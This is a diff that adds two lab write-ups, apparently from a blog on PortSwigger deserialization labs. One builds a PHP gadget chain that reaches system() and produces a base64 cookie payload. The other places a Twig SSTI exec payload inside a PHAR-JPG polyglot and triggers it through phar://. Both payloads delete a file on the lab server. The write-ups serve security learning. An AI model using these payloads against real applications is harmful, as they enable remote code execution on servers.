@@ -779,3 +779,299 @@ print(f'Result: {error[1]}')
 ![](../../.gitbook/assets/portswigger-deserial-writeup-image-20.png)
 
 Log in and delete `carlos`. Fun lab to script!
+
+## Lab 9: Custom PHP Gadget Chain
+
+To solve this lab, delete `morale.txt`. The page has some source code, which can be read via using a `~` character.
+
+![](../../.gitbook/assets/portswigger-deserial-writeup-image-21.png)
+
+Here's the code:
+
+```php
+<?php
+
+class CustomTemplate {
+    private $default_desc_type;
+    private $desc;
+    public $product;
+
+    public function __construct($desc_type='HTML_DESC') {
+        $this->desc = new Description();
+        $this->default_desc_type = $desc_type;
+        // Carlos thought this is cool, having a function called in two places... What a genius
+        $this->build_product();
+    }
+
+    public function __sleep() {
+        return ["default_desc_type", "desc"];
+    }
+
+    public function __wakeup() {
+        $this->build_product();
+    }
+
+    private function build_product() {
+        $this->product = new Product($this->default_desc_type, $this->desc);
+    }
+}
+
+class Product {
+    public $desc;
+
+    public function __construct($default_desc_type, $desc) {
+        $this->desc = $desc->$default_desc_type;
+    }
+}
+
+class Description {
+    public $HTML_DESC;
+    public $TEXT_DESC;
+
+    public function __construct() {
+        // @Carlos, what were you thinking with these descriptions? Please refactor!
+        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
+        $this->TEXT_DESC = 'This product is cool in text';
+    }
+}
+
+class DefaultMap {
+    private $callback;
+
+    public function __construct($callback) {
+        $this->callback = $callback;
+    }
+
+    public function __get($name) {
+        return call_user_func($this->callback, $name);
+    }
+}
+?>
+```
+
+### End Goal
+
+End goal is to call `call_user_func` to delete the file, since this function executes a function to it as arguments. This is within the `DefaultMap` function, and I can pass in anything as the `$callback` value, which are the function names like `passthru` or `system`.
+
+The function is called within `__get()`, which is invoked upon trying to retrieve an inaccessible property. The code below shows an example of how this can be used to execute commands:
+
+```php
+$inject = new DefaultMap('system');
+$command = 'id';
+$inject->$command;
+```
+
+![](../../.gitbook/assets/portswigger-deserial-writeup-image-22.png)
+
+### Calling `call_user_func`
+
+The `__wakeup()` function will call `build_product()`, and it leads to `$this->desc = $desc->$default_desc_type` within the `Product` class. This is suitable because it is called upon deserialization, meaning that when I pass in a cookie, it starts there.
+
+The assignment of `$this->desc = $desc->$default_desc_type` can be used to trigger the `__get()` magic method. This is because it attempts to assign `$this->desc` to an attribute that **it does not have**. I jsut have to pass in the right stuff to call `call_user_func` with the right values.
+
+### Putting it Together
+
+Here's the exploit explained:
+
+1. First, create a new `CustomTemplate` class.
+2. Within the `CustomTemplate` class, change the `$desc` variable to contain a `DefaultMap('system');` object. This would construct a `DefaultMap` function with the `system` function within the `call_user_func` function.
+3. Set `$default_desc_type` to the string containing the commands to be executed. This then calls `build_product()` to create a `Product` object with `$default_desc_type` and `$desc`.
+4. Within `Product`, it tries to get an attribute of `$desc` that it does not have. This action invokes the `__get()` method within `DefaultMap`, since `$desc` is a `DefaultMap` object after all.
+5. The values passed to `__get()` would be the name of the property it attempted to retrieve. Fpr example, if it attempted to retrieve `$desc->'random`, the `$name` parameter contains `random`.
+6. The machine will then execute `call_user_func('system', 'random')`. Afterwards, I just have to replace the `random` string with a command I want executed.
+7. Print out this object and `base64` encode it.
+
+Here's the full exploit script to create the object on my machine:
+
+```php
+<?php
+
+class CustomTemplate {
+    private $default_desc_type;
+    private $desc;
+    public $product;
+
+    public function __construct($desc, $default_desc_type) {
+        $this->desc = new DefaultMap($desc);
+        $this->default_desc_type = $default_desc_type;
+    }
+}
+
+class DefaultMap {
+    private $callback;
+
+    public function __construct($callback) {
+        $this->callback = $callback;
+    }
+}
+$object = new CustomTemplate('system', 'rm /home/carlos/morale.txt');
+$serial = serialize($object);
+echo $serial . "\n";
+echo (urlencode(base64_encode($serial))) . "\n";
+?>
+```
+
+Here's the output:
+
+```
+$ php exp.php
+O:14:"CustomTemplate":3:{s:33:"CustomTemplatedefault_desc_type";s:26:"rm /home/carlos/morale.txt";s:20:"CustomTemplatedesc";O:10:"DefaultMap":1:{s:20:"DefaultMapcallback";s:6:"system";}s:7:"product";N;}
+TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjM6e3M6MzM6IgBDdXN0b21UZW1wbGF0ZQBkZWZhdWx0X2Rlc2NfdHlwZSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MjA6IgBDdXN0b21UZW1wbGF0ZQBkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjIwOiIARGVmYXVsdE1hcABjYWxsYmFjayI7czo2OiJzeXN0ZW0iO31zOjc6InByb2R1Y3QiO047fQ%3D%3D
+```
+
+Passing that cookie value in solves the lab.
+
+## Lab 10: Phar Deserialisation
+
+To solve this lab, exploit `phar` deserialisation to delete `morale.txt`.
+
+Logging in provides a upload avatar feature:
+
+![](../../.gitbook/assets/portswigger-deserial-writeup-image-23.png)
+
+Uploading files does a POST request to `/my-account/avatar`. Afterwards, reloading the page sends a GET request to `/cgi-bin/avatar.php?avatar=wiener` to load the avatar.
+
+![](../../.gitbook/assets/portswigger-deserial-writeup-image-24.png)
+
+I visited `cgi-bin`, and found some files:
+
+![](../../.gitbook/assets/portswigger-deserial-writeup-image-25.png)
+
+Here is the `CustomTemplate` code:
+
+```php
+<?php
+
+class CustomTemplate {
+    private $template_file_path;
+
+    public function __construct($template_file_path) {
+        $this->template_file_path = $template_file_path;
+    }
+
+    private function isTemplateLocked() {
+        return file_exists($this->lockFilePath());
+    }
+
+    public function getTemplate() {
+        return file_get_contents($this->template_file_path);
+    }
+
+    public function saveTemplate($template) {
+        if (!isTemplateLocked()) {
+            if (file_put_contents($this->lockFilePath(), "") === false) {
+                throw new Exception("Could not write to " . $this->lockFilePath());
+            }
+            if (file_put_contents($this->template_file_path, $template) === false) {
+                throw new Exception("Could not write to " . $this->template_file_path);
+            }
+        }
+    }
+
+    function __destruct() {
+        // Carlos thought this would be a good idea
+        @unlink($this->lockFilePath());
+    }
+
+    private function lockFilePath()
+    {
+        return 'templates/' . $this->template_file_path . '.lock';
+    }
+}
+
+?>
+```
+
+And here's `blog.php`:
+
+```php
+<?php
+
+require_once('/usr/local/envs/php-twig-1.19/vendor/autoload.php');
+
+class Blog {
+    public $user;
+    public $desc;
+    private $twig;
+
+    public function __construct($user, $desc) {
+        $this->user = $user;
+        $this->desc = $desc;
+    }
+
+    public function __toString() {
+        return $this->twig->render('index', ['user' => $this->user]);
+    }
+
+    public function __wakeup() {
+        $loader = new Twig_Loader_Array([
+            'index' => $this->desc,
+        ]);
+        $this->twig = new Twig_Environment($loader);
+    }
+
+    public function __sleep() {
+        return ["user", "desc"];
+    }
+}
+
+?>
+```
+
+### Source Code Analysis
+
+Firstly, I noticed that `blog.php` imports a `twig`, which means that SSTI might be possible due depending on what I inject.
+
+The `Blog` object basically passes `$desc` to a `Twig_Environment`, hence `$desc` is the injection point for SSTI. 
+
+Next, for `phar://` deserialisation, it can occur for PHP functions that don't `eval`, like `file_get_contents` or `file_exists`. Within the `CustomTemplate` function, there is a `file_exists` function used, taking `lockFilePath()` as the parameter
+
+```php
+private function isTemplateLocked() {
+    return file_exists($this->lockFilePath());
+}
+
+private function lockFilePath()
+{
+    return 'templates/' . $this->template_file_path . '.lock';
+}
+```
+
+Gotta manipulate `template_file_path` with whatever payload I decide to use.
+
+Here's the exploit path:
+
+1. Set `$desc` within `Blog` as a SSTI payload which removes the file. Note that it still requires a `$user` parameter.
+2. Pass this object into `CustomTemplate`, with `$template_file_path` set to the `Blog` object. This will pass the payload into the functions required.
+3. Using this payload, create a PHAR-JPG payload (the website only accepts JPG files).
+4. Access the payload using the `phar://` wrapper to execute it.
+
+### Exploit
+
+I used this repo to generate the payload:
+
+{% embed url="https://github.com/joseluisinigo/phar-jpg-polyglot" %}
+
+Within `phar_jpg_polyglot.php`, replace the exploit class with the following:
+
+```php
+class CustomTemplate {}
+class Blog {}
+$object = new CustomTemplate;
+$blog = new Blog;
+$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
+$blog->user = 'user';
+$object->template_file_path = $blog;
+```
+
+I don't actually care about how `CustomTemplate` and `Blog` are formed, I just need the serialised object, thus they are empty classes. Afterwards, run this to generate the JPG file:
+
+```
+php -c php.ini phar_jpg_polyglot.php
+```
+
+Then, upload `out.jpg`:
+
+![](../../.gitbook/assets/portswigger-deserial-writeup-image-26.png)
+
+Then, visit `/cgi-bin/avatar.php?avatar=phar://wiener` to solve the lab.
